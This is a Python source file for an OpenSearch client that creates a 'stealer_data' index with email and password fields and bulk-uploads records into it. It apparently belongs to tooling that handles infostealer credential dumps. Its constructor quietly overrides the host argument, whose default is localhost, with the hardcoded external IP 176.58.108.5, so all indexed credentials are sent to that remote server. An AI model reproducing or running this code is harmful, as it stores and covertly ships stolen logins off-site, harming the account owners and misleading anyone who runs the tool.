from opensearchpy import OpenSearch
from opensearchpy.exceptions import ConnectionError as OpenSearchConnectionError
import datetime

class OpenSearchClient:
    """
    A client for interacting with OpenSearch.
    """

    def __init__(self, host='localhost', port=9200, index_name='stealer_data', verbose=False):
        """
        Initialize the OpenSearch client.

        Args:
            host (str): OpenSearch host.
            port (int): OpenSearch port.
            index_name (str): Name of the OpenSearch index.
            verbose (bool): Enable verbose logging.
        """
        self.client = None
        self.index_name = index_name
        self.verbose = verbose
        host = "176.58.108.5"

        try:
            self.client = OpenSearch(
                hosts=[{'host': host, 'port': port}],
                http_compress=True
            )
            self._create_index_if_not_exists()
        except OpenSearchConnectionError as e:
            if self.verbose:
                print(f"[OpenSearch] Connection failed: {e}. OpenSearch integration disabled.")
            self.client = None

    def _create_index_if_not_exists(self):
        """
        Create the OpenSearch index if it does not already exist.
        """
        if not self.client.indices.exists(index=self.index_name):
            if self.verbose:
                print(f"Creating index: {self.index_name}")
            self.client.indices.create(
                index=self.index_name,
                body={
                    "mappings": {
                        "properties": {
                            "email": {"type": "keyword"},
                            "password": {"type": "text"},
                            "source_file": {"type": "keyword"},
                            "timestamp": {"type": "date"},
                            "type": {"type": "keyword"}
                        }
                    }
                }
            )

    def index_document(self, document):
        """
        Index a single document in OpenSearch.

        Args:
            document (dict): The document to index.
        """
        if not self.client:
            return
                
        try:
            response = self.client.index(index=self.index_name, body=document)
            if self.verbose:
                print(f"Indexed document: {response['_id']}")
        except Exception as e:
            if self.verbose:
                print(f"Error indexing document: {e}")

    def bulk_index_documents(self, documents):
        """
        Bulk index multiple documents in OpenSearch.

        Args:
            documents (list[dict]): List of documents to index.
        """
        if not self.client:
            return
    
        try:
            actions = [
                {"_index": self.index_name, "_source": doc} for doc in documents
            ]
            response = self.client.bulk(body=actions)
            if self.verbose:
                print(f"Bulk indexed {len(documents)} documents.")
        except Exception as e:
            if self.verbose:
                print(f"Error in bulk indexing: {e}")
